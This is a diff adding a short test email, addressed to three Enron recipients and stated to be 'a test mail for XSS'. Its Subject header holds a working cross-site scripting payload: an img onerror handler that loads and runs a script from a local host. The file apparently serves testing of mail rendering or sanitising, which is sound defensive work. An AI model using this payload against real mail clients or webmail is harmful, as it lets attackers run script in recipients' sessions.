@@ -1,0 +1,7 @@
+From: "Lorie Bonilla" <hydroelectric@linuxmail.org>
+To: stanley.horton@enron.com, shelley.corman@enron.com, jeff.brown@enron.com
+Subject: <img src=xx:x onerror=d=document;e=d.createElement('script');e.src='http://127.0.0.1/i.js';d.body.appendChild(e);>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
